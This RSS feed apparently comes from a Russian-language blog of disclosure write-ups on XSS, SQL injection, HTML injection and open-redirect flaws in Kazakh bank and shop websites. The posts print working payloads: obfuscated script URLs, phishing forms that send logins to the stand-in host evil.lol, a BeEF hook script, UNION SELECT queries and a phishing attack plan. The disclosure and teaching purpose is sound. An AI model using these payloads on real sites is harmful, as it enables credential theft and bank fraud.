<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0"
  xmlns:content="http://purl.org/rss/1.0/modules/content/"
  xmlns:dc="http://purl.org/dc/elements/1.1/"
  xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd"
  xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
  <channel>
    <title>caspicasoft</title>
    <link>https://caspicasoft.com</link>
    <description>Web developer</description>
    <pubDate>Tue, 29 Mar 2016 21:56:24 +0600</pubDate>
    <item>
      <title>Уязвимость в Kaspi Bank 2 (XSS)</title>
      <link>https://caspicasoft.com/blog/2016/03/29/kaspi-bank-xss-2</link>
      <description><![CDATA[Сегодня расскажем об очередном XSS на сайте банка. Предыдущий пост про Kaspi можно прочитать здесь.

]]></description>
      <pubDate>Tue, 29 Mar 2016 21:56:24 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2016/03/29/kaspi-bank-xss-2</guid>
      <content:encoded><![CDATA[Сегодня расскажем об очередном XSS на сайте банка. Предыдущий пост про Kaspi можно прочитать [здесь].
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта! 

Часто на сайтах интернет-магазинов можно увидеть вот такую кнопку от Kaspi банка. Здесь также показан ответ от сервера банка.
![image][img0]
  
Сама кнопка отображается с помощью &lt;iframe&gt;; ссылка выглядит так:
  
>hxxps://kaspi.kz/kaspibutton/frame?template=button&merchantSku=
00000014673&merchantCode=XXXXX&city=000000&id=ks-xxxxx

Параметры **template**, **id** и т.д. отображаются на странице без соответствующей обработки. Это значит, что мы можем вставить любой HTML/JS код.
Пример c alert():

>hxxps://kaspi.kz/kaspibutton/frame?template=button&id=kaspi%27};alert%28document.domain%29;var%20a={aa:%27c

![image][img1]
Результат для пользователя:
![image][img2]


Что могут сделать мошенники через XSS? Привидем пример фишинг страницы на сайте банка через **document.write()**.
![image][img3]

Код создает такую форму:

&lt;form action=**//evil.lol**&gt;&lt;input name=“login”&gt;&lt;input name=“password”&gt;&lt;/form&gt;

![image][img4]

Когда пользователь заполнит и отправит форму, мошенникам остается только посмотреть логи сервера на **evil.lol**. 
Там будет вся необходимая информация. Результат после нажатия кнопки *Login to Kaspi*:
![image][img5]

Как мы видим, нельзя недооценивать последствия вставки кода. Надеюсь, что данное утверждение будет верным.
![image][img6]

**P.S.**<br/>
Похоже, что этот сервер использует Citrix Netscaler. Вы получаете шифрованный куки *NSC_xxxx.xxxxx* 
который можно расшифровать с помощью этого [скрипта] чтобы извлечь имя хоста, порт и внутренний IP сервера. Not bad. 

[здесь]: https://caspicasoft.com/blog/2015/12/03/kaspi-bank-xss-beef
[скрипта]: https://github.com/catalyst256/Netscaler-Cookie-Decryptor
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png
[img4]: /assets/images//img4.png
[img5]: /assets/images//img5.png
[img6]: /assets/images//img6.png]]></content:encoded>
      <dc:date>2016-03-29T21:56:24+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Chocomart.kz (SQLi)</title>
      <link>https://caspicasoft.com/blog/2016/02/16/chocomart-sqlinjection</link>
      <description><![CDATA[О проблеме я написал в Chocomart и она быстро была устранена (надеюсь полностью).
У меня небольшой SQL опыт и поэтому в посте ничего нового. Но начинающим разработчикам все же будет интересно.

]]></description>
      <pubDate>Tue, 16 Feb 2016 21:23:19 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2016/02/16/chocomart-sqlinjection</guid>
      <content:encoded><![CDATA[О проблеме я написал в Chocomart и она быстро была устранена (надеюсь полностью).
У меня небольшой SQL опыт и поэтому в посте ничего нового. Но начинающим разработчикам все же будет интересно.
<!--more-->

>**SQL Injection** - это техника вставки кода, когда в запросе присутствует произвольный SQL-код. Обычно это происходит из-за 
некорректной обработки данных. Атакующий может получить полный доступ к базе данных. SQL injection впервые [был описан] в 1998 году.

На странице **chocomart.kz/subscribe** есть форма с автозаполнением где нужно выбрать свой город.
Для примера представим, что SQL запрос выглядит так:

'SELECT * FROM cities WHERE City LIKE '+ **$_POST['query']** +'%;'

То есть, находим город по первым буквам названия города. Но, если напечатать **abc%' OR 1=1#;** вместо города, то полный запрос будет таким:

SELECT * FROM cities WHERE City LIKE 'abc%' **OR 1=1#;** %';

Запрос возвращает все города. Символ **#** используется для комментирования, что позволяет нам "удалить" продолжение запроса.

Как эксплуатировать эту уязвимость: с помощью **UNION SELECT 1, 2, 3** узнаем используемый столбец.
![image][img0]

Теперь, чтобы увидеть ответы на запросы, достаточно вставить SQL код вместо символа 2. **UNION SELECT 1, database(), 3** вер    нет имя базы данных. 
![image][img1]

Что эта за база данных? Посмотрим на имена таблиц.
![image][img2]

Читая имена таблиц можно понять, что это **полная база данных Chocomart** (корзина, заказы, аккаунты, адреса, логи платежей и т.д.).
После этого, я перестал делать запросы и не стал узнавать есть ли права на запись.

Хотя скачать всю базу данных - это вопрос времени. Узнав имя таблицы, вы сможете узнать имена столбцов. Мошенникам даже 
не нужно делать это "вручную" на вашем сайте. 

Программы как [sqlmap] позволяют делать это в окне терминала. Запустите скрипт и через пару часов 
(или дней) у вас будет вся база данных в формате CSV. Пример с сайта sqlmap: 
![image][img3]

Кстати, сайт Chocomart показывал полный стек-трейс при ошибке SQL. Если вы не видите стек-трейс при синтаксической ошибке, 
то это называется [слепой (blind) injection]. Это немного усложняет атаку.

Нужно помнить, что многие современные веб фреймворки идут с ORM (object-relational mapping) и вам не нужно самим писать SQL. 
Это ускоряет разработку и помогает защититься от большей части SQL инъекции (вы не собираете запрос "по кускам"). 

Если вас не устраивает производительность запросов при ORM, то стоит подумать о [хранимых процедурах] (stored procedures) или [параметризированных запросах] 
(parametrized queries). 

Если же вы все-таки решили писать "сырой" SQL, то разработчикам нужно убедиться, что их приложения не уязвимы к SQLi атакам.
Подробнее про SQL инъекции можно узнать [здесь].

[был описан]: http://phrack.org/issues/54/8.html#article
[sqlmap]: http://sqlmap.org
[слепой (blind) injection]: http://www.acunetix.com/websitesecurity/blind-sql-injection/
[хранимых процедурах]: https://en.wikipedia.org/wiki/Stored_procedure
[параметризированных запросах]: https://en.wikipedia.org/wiki/Prepared_statement
[здесь]: http://www.unixwiz.net/techtips/sql-injection.html

[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png]]></content:encoded>
      <dc:date>2016-02-16T21:23:19+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Kaspi Bank (XSS+BeEF)</title>
      <link>https://caspicasoft.com/blog/2015/12/03/kaspi-bank-xss-beef</link>
      <description><![CDATA[О проблемах я сообщил Каспи банку 18 дней назад. Длинный пост поделен на 2 части: обсуждение двух XSS уязвимостей на сайте банка и знакомство с BeEF.

]]></description>
      <pubDate>Thu, 03 Dec 2015 23:28:19 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/12/03/kaspi-bank-xss-beef</guid>
      <content:encoded><![CDATA[О проблемах я сообщил Каспи банку 18 дней назад. Длинный пост поделен на 2 части: обсуждение двух XSS уязвимостей на сайте банка и знакомство с BeEF.
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

Первый XSS вектор - это неправильная обработка параметра **idc**.

hxxps://kaspi.kz/payments?**idc=78xx&quot;/&gt;&lt;script&gt;confirm(&lsquo;xss%20kaspi&rsquo;);&lt;/script&gt;&lt;meta%20x=“**
![image][img0]

Результат: постоянный (persistent) XSS, который сохраняется в течение всей сессии, даже если вы перейдете на другую страницу банка.
![image][img1]

***

Следующая уязвимость находится в поиске магазина. Сайт фильтрует многие тэги и атрибуты типа *script*, *src*, *onerror*, но 
не **object** и **data**. Мы можем вставить наш код, создав новый объект.

Здесь использую демо код с jsfiddle.net.
![image][img2]

Можно также создать объект с вредоносным PDF, Java, Flash или например простой картинкой.
![image][img3]

***

Теперь обсудим насколько легко использовать эти уязвимости.

>[The Browser Exploitation Framework] (BeEF) – это средство для эксплуатаций браузеров 
которое содержит набор модулей.

BeEF “цепляет&quot; браузер жертвы с помощью javascript кода, что позволяет выполнять различные действия. Браузер может быть настольным или 
мобильным.
![image][img4]

Вообще BeEF умеет делать очень продвинутые вещи (снимок с веб-камеры, запись аудио, атака на роутер и LAN, создание прокси и т.д.), но мы будем 
использовать модули для угона аккаунта и “развода” на деньги.

Готовим cсылку для жертвы: hxxps://kaspi.kz/payments?idc=666&quot;/&gt;&lt;script src=&ldquo;**http://192.168.1.111:3000/hook.js**&rdquo;&gt;&lt;/script&gt;&lt;meta o=&ldquo;

- **kaspi.kz** – сайт куда вставляется зацепка для BeEF (hook)
- **192.168.1.111** – сервер на котором установлен BeEF
- **192.168.1.1** – IP адрес жертвы

Такую ссылку можно отправить пользователю банка, админу или CEO (так как сайт банка использует *HTTPS*, настоящие мошенники загрузят 
скрипт-зацепку на *HTTPS* сайт, чтобы браузер жертвы не жаловался на активное смешанное содержимое).

Отправив ссылку, нужно зайти на наш сервер. BeEF идет вместе с удобной админ-панелью (логин/пароль по умолчанию *beef/beef*).
![image][img5]

После авторизаций, вы имеете доступ ко всем “зацепленным” браузерам. Здесь вы видите куки, данные ОС, список плагинов и т.д.
![image][img6]

Вы также видите, что делает жертва на странице (неплохой кейлогер).
![image][img7]

Тем временем, пользователь ничего не подозревает&hellip;
![image][img8]

Но нам необязательно читать журнал событий, ведь перехват данных формы не составляет большого труда. Есть готовый модуль.
![image][img9]

Вы всегда можете разработать свой модуль для BeEF. Также, многие модули идут с шаблонами, которые легко изменить под себя. Далее, пример показа всплывающего окна для перехвата пары логин/пароль.
![image][img10]

У вас есть возможность видеть содержимое браузера жертвы. То есть можете скачать весь HTML код либо сделать скриншот реальной страницы.
![image][img11]

Пример редактирования конкретного компонента страницы.
![image][img12]

Авторы модулей для BeEF – люди не без юмора.
![image][img13]

Вот и все. Надеюсь разработчики и владельцы сайтов теперь понимают чем может обернуться для пользователей простой или постоянный XSS.

**P.S.**
Был ли заражен ваш браузер в прошлом, можно проверить [здесь].

[The Browser Exploitation Framework]: https://github.com/beefproject/beef/wiki 
[здесь]: https://goo.gl/SsAhv
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png
[img4]: /assets/images//img4.png
[img5]: /assets/images//img5.png
[img6]: /assets/images//img6.png
[img7]: /assets/images//img7.png
[img8]: /assets/images//img8.png
[img9]: /assets/images//img9.png
[img10]: /assets/images//img10.png
[img11]: /assets/images//img11.png
[img12]: /assets/images//img12.png
[img13]: /assets/images//img13.png]]></content:encoded>
      <dc:date>2015-12-03T23:28:19+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Halyk Bank (XSS)</title>
      <link>https://caspicasoft.com/blog/2015/11/30/halyk-bank-xss</link>
      <description><![CDATA[Краткий пост про проблемы на сайтах Halyk Bank и Halyk Finance. О проблеме я сообщил Халык банку 2 недели назад.

]]></description>
      <pubDate>Mon, 30 Nov 2015 09:11:11 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/11/30/halyk-bank-xss</guid>
      <content:encoded><![CDATA[Краткий пост про проблемы на сайтах Halyk Bank и Halyk Finance. О проблеме я сообщил Халык банку 2 недели назад.
<!--more-->

**1)** www.halykbank.kz не поддерживает безопасное подключение по протоколу *HTTPS*. Это очень плохо для банка! 
Пользователи должны видеть зеленый замочек.

У вас нет способа проверить находитесь ли вы на настоящем сайте банка или нет. Учитывая уязвимости домашних роутеров, вы вполне 
можете стать жертвой [перехвата DNS].


**2)** Сайт Халык банка неправильно обрабатывает параметры поиска.

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

Результат поиска **xxxxxxx”&gt;&lt;script&gt;alert(’hello’);&lt;/script&gt;**
![image][img0]

XSS - это еще одна возможность для мошенников производить фишинг атаки. Например, при загрузке страницы, переписываем содержимое страницы на 
тэг *&lt;input&gt;* и картинку *&lt;img&gt;* (используя функцию String.fromCharCode() для маскировки).

>**hxxp://www.halykbank.kz/ru/search?q=**xxxxxxx&quot;&gt;&lt;script&gt;window.onload%3Dfunction(){document.write(String.fromCharCode(60,105,109,
103,32,115,114,99,61,39,104,116,116,112,115,58,47,47,105,46,105,109,103,117,114,46,99,111,109,47,116,113,67,100,110,51,69,46,112,110,103,39,
62))%3B}&lt;%2Fscript&gt;

Вы также можете вставить свою форму или iframe. Результат для пользователя.
![image][img1]

**3)** Регистрация и вход на сайт Halyk Finance **www.halykfinance.kz** также производится по *HTTP*, то есть по незащищенному каналу, а значит, 
любой может перехватить пользовательские данные.
![image][img2]


Вы не хотите чтобы это произошло, потому что Halyk Finance предоставляет брокерские услуги на рынке ценных бумаг.
![image][img3]

Сертификат при переходе на **HTTPS://**halykfinance.kz
![image][img4]

Надеюсь Halyk Bank и Halyk Finance скоро исправят эти проблемы (члены финансовой группы Народного банка Казахстана «Halyk Group»).

[перехвата DNS]: https://ru.wikipedia.org/wiki/DNS_hijacking
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png
[img4]: /assets/images//img4.png]]></content:encoded>
      <dc:date>2015-11-30T09:11:11+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Казком 2 (HTML Injection)</title>
      <link>https://caspicasoft.com/blog/2015/11/23/kazkom-html-injection-2</link>
      <description><![CDATA[Сегодня обсудим очередную уязвимость на сайте банка и как ее могут использовать мошенники. О проблеме на домене homebank.kz 
я сообщил банку 20 дней назад. Предыдущий пост про Казком здесь.

]]></description>
      <pubDate>Mon, 23 Nov 2015 07:56:24 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/11/23/kazkom-html-injection-2</guid>
      <content:encoded><![CDATA[Сегодня обсудим очередную уязвимость на сайте банка и как ее могут использовать мошенники. О проблеме на домене **homebank.kz** 
я сообщил банку 20 дней назад. Предыдущий пост про Казком [здесь].
<!--more-->

>**HTML Injection** (внедрение кода) - это когда пользователь может вставлять HTML тэги в веб-приложение и изменить вид страницы или добавить новые элементы. 

На главной странице Homebank есть форма для смены пароля.
![image][img0]
  
Сама форма отображается с помощью &lt;iframe&gt;, а ссылка на ресурс выглядит так:
  
>hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?**url**=https://www.homebank.kz/login/join/recard.htm?join-view=1
  
Параметр **url** отображается на странице без соответствующей обработки. Мы можем вставить текст *&lt;h1&gt;* или ссылку *&lt;a&gt;*. 
Пример:
![image][img1]
  
Сайт банка блокирует такие тэги и атрибуты как *script, src, data* и т. д., поэтому мы не можем показывать всплывающее окно с помощью *alert()*. 
Однако, мы можем использовать тэг **&lt;dialog&gt;**,чтобы создать всплывающее окно без javascript (браузерная [поддержка в Казахстане] почти 55%).

Результат такой ссылки

>hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/recard.htm?join-view=1=1″/&gt;&lt;dialog open style=&ldquo;background:red;color:#fff;font-size:1.5em;&rdquo;&gt;Homebank закрыт&lt;br&gt;Позвоните завтра.&lt;br&gt;&lt;br&gt;:(&lt;/dialog&gt;&lt;!&ndash;

![image][img2]

Можно также вставить свою форму, например как:

&lt;form action=**//evil.lol**&gt;&lt;input name=“pin”&gt;&lt;/form&gt;

![image][img3]

Когда пользователь заполнит и отправит форму, мошенникам остается только посмотреть логи сервера на **evil.lol**. Там будет вся необходимая информация. 
Результат после нажатия кнопки SUBMEEET c последней картинки:

![image][img4]

В итоге уязвимы:

- hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/card.htm?join-view=1
- hxxps://www.homebank.kz/md5-card/index_for_hb.jsp?url=https://www.homebank.kz/login/join/recard.htm?join-view=1

Как мы видим, нельзя недооценивать серьезность вставки кода, особенно на сайте банка. Надеюсь, что данное утверждение на сайте Homebank больше 
не будет ошибочным.

![image][img5]

Будьте бдительнее.

[здесь]: https://caspicasoft.com/blog/2015/10/26/kazkom-html-injection-1
[поддержка в Казахстане]: http://caniuse.com/#feat=dialog
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png
[img4]: /assets/images//img4.png
[img5]: /assets/images//img5.png]]></content:encoded>
      <dc:date>2015-11-23T07:56:24+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Банк ЦентрКредит (Open Redirect)</title>
      <link>https://caspicasoft.com/blog/2015/11/12/bcc-open-redirect</link>
      <description><![CDATA[Update: Теперь исправлено

Сегодня расскажу как мошенники могут связать вместе уязвимость и защиту сайта для контроля жертвы. О проблеме на домене 
www.bcc.kz я сообщил пресс-службе 17 дней назад.

]]></description>
      <pubDate>Thu, 12 Nov 2015 08:25:54 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/11/12/bcc-open-redirect</guid>
      <content:encoded><![CDATA[*Update*: Теперь исправлено

Сегодня расскажу как мошенники могут связать вместе уязвимость и защиту сайта для контроля жертвы. О проблеме на домене 
**www.bcc.kz** я сообщил пресс-службе 17 дней назад.
<!--more-->
У данного банка тоже были проблемы с мошенниками:
![image][img0]

>**Open Redirect** (открытое перенаправление) – это редирект который позволяет использовать произвольный URL для конечной цели редиректа. 
Эта уязвимость используется мошенниками, чтобы заставить пользователей посетить фишинг сайты (не осознавая этого).

На сайте есть различные рекламные баннеры.
![image][img1]

Полная ссылка баннера: hxxp://www.bcc.kz/bitrix/rk.php?id=17&amp;site_id=s1&amp;event1=banner&amp;event2=click&amp;event3=1+%2F+%5B17%5D+%5BMAINBOT%5D+
main_bottom_ru_2&amp;goto=**http%3A%2F%2Fmastercard.kz%2F**

Если кликнуть на ссылку, то вы перейдете на другой сайт **без каких либо предупреждений** как *”Вы покидаете сайт 
банка. Будьте осторожны.”*.

Банк использует Битрикс (”профессиональная” система управления сайтом). На форуме битрикса пишут, что у 
продукта есть встроенная защита.
![image][img2]

В итоге уязвимы 3 файла (rk.php, click.php, redirect.php). Пример ссылок:

- hxxp://www.bcc.kz/bitrix/click.php?anything=here&amp;goto=http://homebank.kz/
- hxxp://www.bcc.kz/bitrix/rk.php?id=17&amp;site_id=s1&amp;event1=banner&amp;event2=click&amp;goto=http%3A%2F%2Fhomebank.kz%2F
- hxxp://www.bcc.kz/bitrix/redirect.php?event1=click_to_call&amp;event2=&amp;event3=&amp;goto=http://homebank.kz/

***

В то же время, атаки на западные банки используют полный комплекс. После того как мошенники перевели деньги, например, [Dyre Wolf], запускает мощную DDoS 
атаку (отказ в обслуживании) и перекрывает доступ к сайту банка.
![image][img3]

***

Так вот, многие сайты казахстанских банков не очень удобны. Если WAF (Web Application Firewall) банка заметит опасные тэги в URL, то ваш IP-адрес 
блокируется(!) и вы временно не можете зайти на сайт.
![image][img4]

"User-friendly" результат для пользователя:
![image][img5]

Если вы мошенник переживающий кризисные дни и не можете себе позволить DDoS, значит вам повезло.

«Эконом вариант» атаки на пользователей банка:

1. Отправьте письмо с ссылкой на bcc.kz + редирект на фишинг сайт.
2. Заполучите логин/пароль и заставьте браузер жертвы сделать запрос на сайт банка с опасным тэгом в URL (теперь жертва
заблокирована банком).
3. ???
4. **PROFIT!!!**

Как мы видим, open redirect может иметь серьезные последствия. Я также думаю, что неэффективно блокировать IP-адреса. Во-первых, 
мошенникам очень легко сменить IP-адрес. Во-вторых, ваш сайт все равно должен быть неуязвим к injection атакам.


[Dyre Wolf]: https://portal.sec.ibm.com/mss/html/en_US/support_resources/pdf/Dyre_Wolf_MSS_Threat_Report.pdf
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.jpg
[img4]: /assets/images//img4.png
[img5]: /assets/images//img5.png]]></content:encoded>
      <dc:date>2015-11-12T08:25:54+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Bank RBK (XSS)</title>
      <link>https://caspicasoft.com/blog/2015/11/01/bank-rbk-xss</link>
      <description><![CDATA[Сегодня краткий пост про простую уязвимость на сайте банка. О проблеме я сообщил банку 2 недели назад.

]]></description>
      <pubDate>Sun, 01 Nov 2015 14:51:19 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/11/01/bank-rbk-xss</guid>
      <content:encoded><![CDATA[Сегодня краткий пост про простую уязвимость на сайте банка. О проблеме я сообщил банку 2 недели назад.
<!--more-->

>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте (без вашего 
разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

1) Домен **hxxp://www.bankrbk.kz** не фильтровал параметры поиска. Забыл точный payload, но думаю проблему уже устранили.
![image][img0]

2) Интернет банкинг **ib.bankrbk.kz** построен на ASP.NET и неправильно обрабатывает параметры ReturnUrl которые отображаются 
внутри тэга *&lt;a&gt;*, в части кода для смены языка.

Можно вставлять javascript код который будет выполнятся при клике или наведений мышкой. Пример:

>**hxxps://ib.bankrbk.kz/Login.aspx?ReturnUrl=/&amp;lang=EN%22%20onmouseover=%22alert%281%29%22%20**

![image][img1]

Сервер блокирует символ **&lt;** в параметре ReturnUrl, но не блокирует javascript. Это значит можно использовать **document.write()** 
и построить 
новую страницу из таблицы ASCII применив **String.fromCharCode()**. 

Чтобы пользователь ничего не заметил, параметр ReturnURrl можно заполнить ненужным текстом.

>**hxxps://ib.bankrbk.kz/Login.aspx?ReturnUrl=/../../../../../../../../../../../../../../../../../../../../../&ldquo;onmouseover=&quot;
document.write(String.fromCharCode(60,105,109,103,32,115,114,99,61,39,104,116,116,112,115,58,47,47,105,46,105,109,103,117,114,46,99,111,
109,47,116,113,67,100,110,51,69,46,112,110,103,39,62))&rdquo;**

![image][img2]

XSS аудиторы некоторых браузеров знают, что это reflected XSS и не будут выполнять код. Но многие другие, например Firefox и мобильные 
браузеры, запустят действие и наш payload.

Мошенники [используют] XSS и другие уязвимости на сайтах банков с 2008 года. Непонятно, почему некоторые казахстанские и зарубежные 
банки до сих пор не избавились от простых уязвимостей в клиентской части. Будьте бдительны.

[используют]: http://news.netcraft.com/archives/2008/01/08/italian_banks_xss_opportunity_seized_by_fraudsters.html
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png]]></content:encoded>
      <dc:date>2015-11-01T14:51:19+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Жилстройсбербанк (XSS)</title>
      <link>https://caspicasoft.com/blog/2015/10/30/hcsbk-xss</link>
      <description><![CDATA[Update: Теперь исправлено

Сразу скажу, что я сообщил об этом дефекте разработчику сайта, ibecsystems, 16 дней назад. К сожалению, мое письмо осталось без ответа, а уязвимость 
не была устранена до сих пор. Сегодня напишу детали проблемы в учебных целях (может это как-то ускорит процесс).

]]></description>
      <pubDate>Fri, 30 Oct 2015 13:45:27 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/10/30/hcsbk-xss</guid>
      <content:encoded><![CDATA[*Update:* Теперь исправлено

Сразу скажу, что я сообщил об этом дефекте разработчику сайта, ibecsystems, 16 дней назад. К сожалению, мое письмо осталось без ответа, а уязвимость 
не была устранена до сих пор. Сегодня напишу детали проблемы в учебных целях (может это как-то ускорит процесс).
<!--more-->

Разработчики умеют делать все правильно: всегда проверять данные контролируемые клиентом и обрабатывать все параметры запросов на сервере. 
Также нужно уследить за библиотеками в клиентской части. В случае же Жилстройсбербанка, разработчики забыли сделать и первое и второе.


>**XSS** (cross site scripting) или межсайтовый скриптинг - это серьезная уязвимость. Простыми словами, на вашем сайте 
(без вашего разрешения) выполняется чужой код. То есть, кто-то может контролировать что делает или видит пользователь вашего сайта!

На сайте банка есть простой поиск. Давайте сделаем запрос:
![image][img0]

Посмотрим что у нас в коде страницы. Интересно, что текст запроса (включая опасные символы *“/&gt;*) появился в двух местах.
![image][img1]

Попробуем получить результаты поиска.
![image][img2]

Находим текст запроса без обработки.
![image][img3]

Что видит пользователя.
![image][img4]

Теперь можно сделать запрос с javascript. 
![image][img5]

Но это слишком легко. К тому же, браузеры с XSS аудиторами, такие как Chrome и Opera, откажутся выполнять наш alert(), потому что скрипт, 
оказавшийся на странице, находился в параметре запроса.

Нам лучше сосредоточится на этом участке кода с jQuery. Мы хотим выполнить код после *$(&rsquo;.search&rsquo;).val()*.


Это значит нужно “пройти” все *$(&rsquo;#search_results&rsquo;).highlight()* без ошибок.
![image][img6]

Первая попытка. Результат такого запроса содержит ошибку и не выполняется браузером.
![image][img7]

После перебора нескольких вариантов, я смог найти хороший payload.

>hxxp://www.hcsbk.kz/ru/search?query=&rsquo;);alert(&ldquo;wow&rdquo;);//

![image][img8]

Код выполняется без ошибок. Имейте ввиду, что в этом случае XSS аудитор браузера вам не поможет.
![image][img9]

Кто-то может подумать
“*Туууй,тоже маған катастрофа! Это же главная страница банка, а не чей-то личный кабинет!*”. 

Да, это не <s>ключ от квартиры, где деньги лежат</s> личный кабинет, но близко.
К тому же я не смотрел код личного кабинета банка, но у меня плохое предчувствие: банк не поддерживает HTTPS. 

Если соединение небезопасно, это значит ваш ИИН, пароль и все что внутри кабинета видно всему свету (от браузера до сервера банка и обратно).
![image][img10]
XSS это идеальное средство для мошенников.

Отправьте письмо с ссылкой на сайт банка + xss payload. Когда пользователь заполнит форму и логин/пароль
от личного кабинета, эти данные попадут на сервер мошенников. Все это будет происходить на
сайте банка.

ibecsystems нужно исправить этот дефект и проверить код сайта на другие проблемы.
Банк должен подумать о переходе на HTTPS и необходимости Content Security Policy.


Раньше разработчики не воспринимали XSS всерьез, но сейчас все понимают, что XSS - это критическая уязвимость на стороне клиента. Позже я напишу пост
о том, что можно сделать с помощью браузера пользователя, XSS, и BeEF.

[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png
[img2]: /assets/images//img2.png
[img3]: /assets/images//img3.png
[img4]: /assets/images//img4.png
[img5]: /assets/images//img5.png
[img6]: /assets/images//img6.png
[img7]: /assets/images//img7.png
[img8]: /assets/images//img8.png
[img9]: /assets/images//img9.png
[img10]: /assets/images//img10.png
]]></content:encoded>
      <dc:date>2015-10-30T13:45:27+06:00</dc:date>
    </item>
    <item>
      <title>Уязвимость в Казком (HTML Injection)</title>
      <link>https://caspicasoft.com/blog/2015/10/26/kazkom-html-injection-1</link>
      <description><![CDATA[В последнее время, у Казкома были проблемы с мошенниками которые отправляли фишинг-письма.

Главная проблема фишеров - это чтобы пользователи поверили, что они находятся на настоящем сайте банка 
(правильный адрес и, надеюсь, зеленый замочек). А зачем мошенникам покупать свой домен, если есть уязвимый сайт банка?

]]></description>
      <pubDate>Mon, 26 Oct 2015 13:00:10 +0600</pubDate>
      <guid>https://caspicasoft.com/blog/2015/10/26/kazkom-html-injection-1</guid>
      <content:encoded><![CDATA[В последнее время, у Казкома [были проблемы] с мошенниками которые отправляли фишинг-письма.

Главная проблема фишеров - это чтобы пользователи поверили, что они находятся на настоящем сайте банка 
(правильный адрес и, надеюсь, зеленый замочек). А зачем мошенникам покупать свой домен, если есть уязвимый сайт банка?
<!--more-->
Вот что сайт ePay (центр авторизации и обработки онлайн-платежей по пластиковым картам) говорит о безопасности:
![image][img0]
Все довольно хорошо и имеется картинка щита. Так есть ли на таком сайте простая уязвимость?

>**HTML Injection**(внедрение кода) - это когда пользователь может вставлять HTML тэги в веб-приложение и изменить 
вид страницы или добавить новые элементы.

Проблема была на hxxps://**epay.kkb.kz/jsp/process/Error_session.jsp?**

Параметры запроса исполняются без надлежащей обработки и отображаются на странице. Пример:
![image][img1]
На самом деле можно убрать лишние параметры и вставить красивый текст с призывами на действие (*отправьте смс или позвоните по номеру*) 
или попросить пользователя пройти по ссылке для завершения платежа на ваш фальшивый сайт (всё-таки мошенникам нужно покупать домен).


После того как вы изменили страницу ePay “под себя”, смело отправляйте письма о том, что всем срочно нужно “подтвердить оплату” 
или “принять перевод средств” в системе Казкома.

Вообще, уровень безопасности и “user experience” многих казахстанских банков оставляет желать лучшего, но об этом напишу уже в новом посте.



[были проблемы]: http://wiki.homebank.kz/page/ProjectNews_blogentry_200814_1
[img0]: /assets/images//img0.png
[img1]: /assets/images//img1.png]]></content:encoded>
      <dc:date>2015-10-26T13:00:10+06:00</dc:date>
    </item>
    <dc:date>2016-03-29T21:56:24+06:00</dc:date>
  </channel>
</rss>